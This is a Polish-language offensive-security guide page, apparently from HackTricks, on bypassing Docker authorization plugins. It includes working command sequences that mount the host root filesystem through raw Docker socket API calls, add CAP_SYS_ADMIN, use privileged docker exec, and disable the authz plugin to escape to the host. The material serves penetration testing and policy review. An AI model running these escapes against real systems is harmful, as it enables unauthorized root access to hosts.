# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Runtime authorization plugins to dodatkowa warstwa policy, która decyduje, czy caller może wykonać określoną akcję daemona. Docker jest klasycznym przykładem. Domyślnie każdy, kto może komunikować się z Docker daemon, ma w praktyce szeroką kontrolę nad nim. Authorization plugins próbują zawęzić ten model, analizując uwierzytelnioną tożsamość użytkownika oraz żądaną operację API, a następnie zezwalając na request lub go odrzucając zgodnie z policy.

Temat ten zasługuje na osobną stronę, ponieważ zmienia model exploitation, gdy attacker ma już dostęp do Docker API lub do użytkownika w grupie `docker`. W takich środowiskach pytanie nie brzmi już tylko: „czy mogę dotrzeć do daemona?”, ale także: „czy daemon jest chroniony przez authorization layer, a jeśli tak, czy można ominąć tę warstwę przez nieobsługiwane endpointy, słabe parsowanie JSON lub uprawnienia do zarządzania pluginami?”.

## Działanie

Gdy request dociera do Docker daemon, authorization subsystem może przekazać kontekst requestu do jednego lub większej liczby zainstalowanych pluginów. Plugin widzi uwierzytelnioną tożsamość użytkownika, szczegóły requestu, wybrane nagłówki oraz części body requestu lub response, gdy content type jest odpowiedni. Wiele pluginów można łączyć w chain, a dostęp zostaje przyznany tylko wtedy, gdy wszystkie pluginy zezwolą na request.

Ten model wydaje się solidny, ale jego bezpieczeństwo zależy całkowicie od tego, jak dokładnie autor policy zrozumiał API. Plugin, który blokuje `docker run --privileged`, ale ignoruje `docker exec`, pomija alternatywne klucze JSON, takie jak top-level `Binds`, lub zezwala na administrację pluginami, może tworzyć fałszywe poczucie ograniczenia, jednocześnie pozostawiając otwarte bezpośrednie ścieżki privilege-escalation.

## Common Plugin Targets

Ważne obszary do przeglądu policy to:

- endpointy tworzenia kontenerów
- pola `HostConfig`, takie jak `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` oraz opcje współdzielenia namespace
- działanie `docker exec`
- endpointy zarządzania pluginami
- dowolny endpoint, który może pośrednio wywoływać runtime actions poza zamierzonym modelem policy

Historycznie przykłady takie jak plugin `authz` firmy Twistlock oraz proste educational plugins, takie jak `authobot`, ułatwiały analizę tego modelu, ponieważ ich pliki policy i ścieżki kodu pokazywały, jak faktycznie implementowano mapowanie endpointów na akcje. W ramach assessmentu najważniejsza lekcja jest taka, że autor policy musi rozumieć pełną powierzchnię API, a nie tylko najbardziej widoczne komendy CLI.

## Abuse

Pierwszym celem jest ustalenie, co faktycznie jest blokowane. Jeśli daemon odrzuca akcję, błąd często `leaks` nazwę pluginu, co pomaga zidentyfikować używany mechanizm kontroli:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Jeśli potrzebujesz szerszego profilowania endpointów, narzędzia takie jak `docker_auth_profiler` są przydatne, ponieważ automatyzują zwykle powtarzalne zadanie sprawdzania, które trasy API i struktury JSON są faktycznie dozwolone przez plugin.

Jeśli środowisko korzysta z niestandardowego pluginu i możesz wchodzić w interakcję z API, wylicz, które pola obiektów są faktycznie filtrowane:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Te kontrole mają znaczenie, ponieważ wiele błędów autoryzacji dotyczy konkretnych pól, a nie całych koncepcji. Plugin może odrzucać wzorzec CLI, nie blokując w pełni równoważnej struktury API.

### Pełny przykład: `docker exec` dodaje uprawnienia po utworzeniu kontenera

Politykę, która blokuje tworzenie uprzywilejowanych kontenerów, ale zezwala na tworzenie kontenerów bez ograniczeń oraz użycie `docker exec`, można nadal obejść:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Jeśli daemon zaakceptuje drugi krok, użytkownik odzyskał uprzywilejowany interaktywny proces wewnątrz kontenera, który autor polityki uważał za ograniczony.

### Pełny przykład: Bind Mount przez Raw API

Niektóre wadliwe polityki sprawdzają tylko jeden format JSON. Jeśli bind mount root filesystem nie jest konsekwentnie blokowany, host nadal może zostać zamontowany:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ta sama koncepcja może również pojawić się w sekcji `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Skutkiem jest pełne wydostanie się do systemu plików hosta. Interesującym szczegółem jest to, że obejście wynika z niepełnego pokrycia regułami, a nie z błędu w kernelu.

### Pełny przykład: Niesprawdzany atrybut capability

Jeśli policy zapomni filtrować atrybutu związanego z capability, attacker może utworzyć kontener, który odzyska niebezpieczną capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Gdy dostępne jest `CAP_SYS_ADMIN` lub podobna silna capability, możliwe staje się zastosowanie wielu technik breakout opisanych w [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md).

### Pełny przykład: Wyłączenie pluginu

Jeśli dozwolone są operacje zarządzania pluginami, najprostszym obejściem może być całkowite wyłączenie mechanizmu:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
To błąd zasad na poziomie control-plane. Warstwa autoryzacji istnieje, ale użytkownik, którego miała ograniczać, nadal ma uprawnienia do jej wyłączenia.

## Kontrole

Te polecenia służą do ustalenia, czy istnieje warstwa zasad oraz czy wydaje się kompletna, czy tylko powierzchowna.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Co jest tutaj interesujące:

- Komunikaty odmowy zawierające nazwę pluginu potwierdzają obecność warstwy autoryzacji i często ujawniają dokładną implementację.
- Lista pluginów widoczna dla attackera może wystarczyć do ustalenia, czy możliwe są operacje wyłączania lub rekonfiguracji.
- Policy blokująca tylko oczywiste działania CLI, ale nie surowe żądania API, powinna być traktowana jako możliwa do obejścia, dopóki nie zostanie udowodnione inaczej.

## Runtime Defaults

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie wyłączone | Dostęp do daemona jest w praktyce całkowity albo żaden, chyba że skonfigurowano plugin autoryzacji | niekompletna policy pluginu, blacklists zamiast allowlists, zezwalanie na zarządzanie pluginami, przeoczenia na poziomie pól |
| Podman | Brak powszechnego bezpośredniego odpowiednika | Podman zazwyczaj w większym stopniu opiera się na uprawnieniach Unix, wykonywaniu rootless i decyzjach dotyczących ekspozycji API niż na pluginach authz w stylu Dockera | szerokie udostępnienie rootful Podman API, słabe uprawnienia do socketu |
| containerd / CRI-O | Inny model kontroli | Te runtime'y zazwyczaj opierają się na uprawnieniach do socketu, granicach zaufania węzła i kontrolach orchestratora wyższej warstwy, a nie na pluginach authz Dockera | montowanie socketu we workloadach, słabe założenia dotyczące zaufania lokalnego dla węzła |
| Kubernetes | Używa authn/authz na warstwach API-servera i kubeleta, a nie pluginów authz Dockera | RBAC klastra i kontrole admission stanowią główną warstwę policy | nadmiernie szeroki RBAC, słaba policy admission, bezpośrednie udostępnienie kubeleta lub API runtime'u |

{{#include ../../../banners/hacktricks-training.md}}
